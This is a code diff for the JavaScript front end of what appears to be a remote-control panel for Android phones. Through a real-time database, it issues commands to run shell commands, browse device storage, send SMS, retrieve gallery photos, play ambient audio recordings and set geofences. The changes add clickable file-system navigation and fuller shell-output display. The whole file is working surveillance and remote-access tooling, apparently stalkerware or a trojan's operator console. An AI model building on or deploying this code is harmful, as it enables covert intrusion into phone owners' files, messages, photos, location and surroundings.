@@ -143,7 +143,7 @@ function injectAdvancedControls() {
     shellW.after(smsW);
 
     const fileW = document.createElement('div'); fileW.className = 'shell-control-wrapper';
-    fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><pre id="file-output" style="display:none;"></pre>`;
+    fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><div id="file-output" style="display:none;background:#050510;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:400px;overflow:auto;font-family:monospace;line-height:1.6;"></div>`;
     smsW.after(fileW);
 
     const geoW = document.createElement('div'); geoW.className = 'shell-control-wrapper';
@@ -335,8 +335,6 @@ function initializeDataFeedListeners(uid) {
     // ── GALLERY WITH REAL IMAGE THUMBNAILS ───────────
     listenToFeed(uid, 'gallery_list', (d) => {
         const p = d.photos||[]; const f = document.getElementById('gallery-feed'); if(!f) return;
-
-        // Show loading progress
         if(d.status==='loading') {
             let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
             html += p.slice(0,10).map(p => {
@@ -349,9 +347,7 @@ function initializeDataFeedListeners(uid) {
             f.innerHTML = html;
             return;
         }
-
         if(!p.length){f.innerHTML='No gallery data yet';return;}
-
         f.innerHTML = p.slice(0,30).map(p => {
             const thumb = p.thumbnail_url || '';
             const imgHtml = thumb
@@ -362,12 +358,80 @@ function initializeDataFeedListeners(uid) {
         }).join('');
     });
 
+    // ── SHELL OUTPUT ─────────────────────────────────
     listenToFeed(uid, 'shell_output', (d) => {
-        const o = document.getElementById('shell-output'); if(o&&d){o.style.display='block';o.textContent=`$ ${d.command||''}\n\n${d.stdout||'(no output)'}\n${d.stderr?'\nSTDERR: '+d.stderr:''}\n\nExit code: ${d.exit_code??'?'}`;}
+        const o = document.getElementById('shell-output'); if(!o||!d) return;
+        o.style.display = 'block';
+        let text = `$ ${d.command||''}\n\n`;
+        if(d.exit_code === -999) {
+            text += '⏳ Executing...\n';
+        } else {
+            text += (d.stdout || '(no output)');
+            if(d.stderr) text += `\n\nSTDERR:\n${d.stderr}`;
+            text += `\n\nExit code: ${d.exit_code ?? '?'}`;
+            if(d.timed_out) text += ' ⚠️ TIMED OUT';
+        }
+        o.textContent = text;
     });
+
+    // ── FILE BROWSER WITH NAVIGATION ─────────────────
     listenToFeed(uid, 'file_browser', (d) => {
-        const o = document.getElementById('file-output'); if(o&&d){o.style.display='block';const e=d.entries||[];let t=`📁 ${d.current_path||'/'}\n\n`;t+=e.map(e=>{const i=e.is_directory?'📁':'';const s=e.is_directory?'':` (${fmtSize(e.size)})`;return `${i} ${e.name}${s}`;}).join('\n');o.textContent=t;}
+        const o = document.getElementById('file-output'); if(!o||!d) return;
+        o.style.display = 'block';
+
+        if(d.error) {
+            o.innerHTML = '<span style="color:#ff6b6b;">❌ ' + esc(d.error) + '</span>';
+            return;
+        }
+
+        // Single file info view
+        if(d.is_file) {
+            let html = '<div style="margin-bottom:10px;">';
+            html += '<div style="font-size:14px;color:#fff;margin-bottom:6px;">' + esc(d.name||'File') + '</div>';
+            html += '<div style="color:#888;font-size:11px;">Size: ' + (d.size_formatted||'?') + '</div>';
+            html += '<div style="color:#888;font-size:11px;">Type: ' + (d.file_type||'unknown') + '</div>';
+            html += '<div style="color:#888;font-size:11px;">Path: ' + esc(d.absolute_path||d.current_path||'') + '</div>';
+            html += '<div style="color:#888;font-size:11px;">Modified: ' + (d.last_modified ? new Date(d.last_modified).toLocaleString() : '--') + '</div>';
+            html += '<div style="color:#888;font-size:11px;">Readable: ' + (d.can_read ? '✅' : '❌') + ' Writable: ' + (d.can_write ? '✅' : '❌') + '</div>';
+            html += '</div>';
+            if(d.entries) {
+                html += '<div style="border-top:1px solid #333;padding-top:8px;margin-top:8px;">';
+                d.entries.forEach(function(e) {
+                    html += '<div style="padding:4px 0;cursor:pointer;color:#4ecdc4;" onclick="navigateToFile(\'' + e.path.replace(/'/g,"\\'") + '\')">' + esc(e.name) + '<br><span style="font-size:10px;color:#555;">' + esc(e.path) + '</span></div>';
+                });
+                html += '</div>';
+            }
+            o.innerHTML = html;
+            return;
+        }
+
+        // Directory listing
+        let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
+        html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files';
+        if(d.shown_files !== undefined && d.total_files > d.shown_files) html += ' (showing ' + d.shown_files + ')';
+        html += '</div>';
+
+        var entries = d.entries || [];
+        entries.forEach(function(e) {
+            var pathEsc = e.path.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+            if(e.is_directory) {
+                html += '<div style="padding:6px 0;border-bottom:1px solid #111;cursor:pointer;" onclick="navigateToFile(\'' + pathEsc + '\')">';
+                html += '<span style="color:#ffd93d;font-size:12px;">' + esc(e.name) + '</span>';
+                if(e.size_formatted) html += ' <span style="color:#555;font-size:10px;">' + esc(e.size_formatted) + '</span>';
+                html += '<br><span style="color:#4ecdc4;font-size:10px;">' + esc(e.path) + '</span>';
+                html += '</div>';
+            } else {
+                html += '<div style="padding:6px 0;border-bottom:1px solid #111;">';
+                html += '<span style="font-size:12px;">' + esc(e.name) + '</span>';
+                html += ' <span style="color:#555;font-size:10px;">' + (e.size_formatted||'') + '</span>';
+                html += '<br><span style="color:#444;font-size:10px;">' + esc(e.path) + '</span>';
+                html += '</div>';
+            }
+        });
+
+        o.innerHTML = html;
     });
+
     listenToFeed(uid, 'geofence_status', (d) => {
         const f = document.getElementById('geofence-feed'); if(!f||!d||!d.active) return;
         f.innerHTML = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)</div>` + f.innerHTML;
@@ -392,7 +456,6 @@ function initializeDataFeedListeners(uid) {
             b.classList.remove('active');
             if(s){s.textContent='OFF';s.style.color='#666';}
         }
-
         const af = document.getElementById('ambient-feed');
         if(af) {
             let html = `<div class="feed-item"><strong>Status:</strong> ${d.status||'unknown'}</div>`;
@@ -404,15 +467,13 @@ function initializeDataFeedListeners(uid) {
             if(d.last_audio_segment) html += `<div class="feed-item"><small>${d.last_audio_segment}</small></div>`;
             af.innerHTML = html;
         }
-
         if(d.last_audio_url) {
             const aud = document.getElementById('mediaAudioPlayer');
             const audC = document.getElementById('audio-container');
             const ph = document.getElementById('mediaPlaceholderText');
             if(aud && aud.src !== d.last_audio_url) {
                 if(ph) ph.style.display='none';
-                aud.src = d.last_audio_url;
-                aud.load();
+                aud.src = d.last_audio_url; aud.load();
                 aud.style.display='block';
                 if(audC) audC.style.display='block';
                 const ts = document.getElementById('captureTimestamp');
@@ -441,7 +502,6 @@ function initializeDataFeedListeners(uid) {
         }
         html += `<div class="feed-item"><small>${fmtTime(d.timestamp)}</small></div>`;
         f.innerHTML = html;
-
         const bf = document.getElementById('battery-feed');
         if(bf && !bf.innerHTML.includes('Network Traffic')) {
             bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
@@ -454,6 +514,16 @@ function listenToFeed(uid, path, cb) {
     if(deviceListeners[k]) off(deviceListeners[k]);
     deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
 }
+
+// ── FILE BROWSER NAVIGATION (global function) ────────
+window.navigateToFile = function(path) {
+    if(!selectedDevice) return;
+    sendCmd(selectedDevice, 'list_files', path.trim());
+    var o = document.getElementById('file-output');
+    if(o) { o.style.display='block'; o.innerHTML='<span style="color:#ffaa00;">⏳ Loading ' + esc(path) + '...</span>'; }
+    var inp = document.getElementById('file-path');
+    if(inp) inp.value = path.trim();
+};
 
 function setupCommandListeners(uid) {
     setupToggle('cmd-flashlight', uid, 'flashlight');
@@ -491,7 +561,7 @@ function setupCommandListeners(uid) {
     if(ssb) ssb.onclick = () => { const n=document.getElementById('sms-number')?.value?.trim(); const b=document.getElementById('sms-body')?.value?.trim(); if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} };
 
     const lfb = document.getElementById('cmd-listfiles');
-    if(lfb) lfb.onclick = () => { const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; sendCmd(uid,'list_files',p); const o=document.getElementById('file-output'); if(o){o.style.display='block';o.textContent='⏳ Loading...';} };
+    if(lfb) lfb.onclick = () => { const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; sendCmd(uid,'list_files',p); const o=document.getElementById('file-output'); if(o){o.style.display='block';o.innerHTML='<span style="color:#ffaa00;">⏳ Loading...</span>';} };
 
     const sgb = document.getElementById('cmd-setgeo');
     if(sgb) sgb.onclick = () => { const la=parseFloat(document.getElementById('geo-lat')?.value); const ln=parseFloat(document.getElementById('geo-lng')?.value); const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} };
